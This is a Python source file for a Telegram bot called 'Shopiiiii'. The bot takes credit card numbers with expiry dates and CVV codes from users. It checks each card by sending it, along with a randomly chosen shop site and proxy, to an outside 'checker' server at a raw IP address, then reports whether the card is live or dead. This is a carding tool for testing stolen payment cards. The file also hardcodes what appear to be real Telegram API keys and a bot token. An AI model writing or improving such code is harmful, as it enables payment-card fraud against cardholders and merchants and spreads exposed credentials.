from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
from telethon import TelegramClient, events, Button
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
from datetime import datetime

# --- RENDER HEALTH CHECK SERVER ---
class HealthCheckHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Bot is alive!")

def run_health_check():
    server = HTTPServer(('0.0.0.0', 10000), HealthCheckHandler)
    server.serve_forever()

threading.Thread(target=run_health_check, daemon=True).start()

# --- CONFIGURATION ---
API_ID = 38807471
API_HASH = '9bbfb9efe1a47596cf7f1b20017f5dc6'
# UPDATED WITH YOUR NEW TOKEN
BOT_TOKEN = '7660700670:AAG6iCTwKo3p2O-N_2Mf-En9Bwx5pMMBxaU'
# UPDATED WITH NEW API ENDPOINT
CHECKER_API_URL = 'http://148.230.102.178:8081/'

PREMIUM_EMOJI_IDS = {
    "✅": "6023660820544623088", "🔥": "5999340396432333728", 
    "❌": "6037570896766438989", "⚡": "6026367225466720832",
    "💳": "5971944878815317190", "💠": "5971837723676249096"
}

# --- LOGIC ---
def premium_emoji(text):
    if not text: return text
    result = text
    for emoji, doc_id in PREMIUM_EMOJI_IDS.items():
        result = result.replace(emoji, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
    return result

def is_premium(user_id):
    return True  # Allows everyone

def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    return [f"{c}|{m}|{'20'+y if len(y)==2 else y}|{cv}" for c, m, y, cv in re.findall(pattern, text)]

bot = TelegramClient('shopii_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    await event.reply(premium_emoji("<b>⚡ Shopiiiii Live!</b>\nSend /cc card info to check."), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'^/cc\s+'))
async def single_cc(event):
    cards = extract_cc(event.message.text)
    if not cards: return await event.reply("❌ Format: /cc card|mm|yy|cvv")
    
    status = await event.reply(premium_emoji("⚡ Checking..."))
    
    try:
        # Assumes sites.txt and proxy.txt exist in the same folder
        with open('sites.txt', 'r') as f: sites = [l.strip() for l in f if l.strip()]
        with open('proxy.txt', 'r') as f: proxies = [l.strip() for l in f if l.strip()]
        
        params = {'cc': cards[0], 'url': random.choice(sites), 'proxy': random.choice(proxies)}
        
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=60)) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                data = await resp.json(content_type=None)
        
        res = f"<b>💠 Result: {data.get('Status', 'Dead')}</b>\n<code>{cards[0]}</code>\n{data.get('Response', 'N/A')}"
        await status.edit(premium_emoji(res), parse_mode='html')
    except Exception as e:
        await status.edit(f"❌ Error: {e}")

print("✅ Bot is running.")
bot.run_until_disconnected()
                          
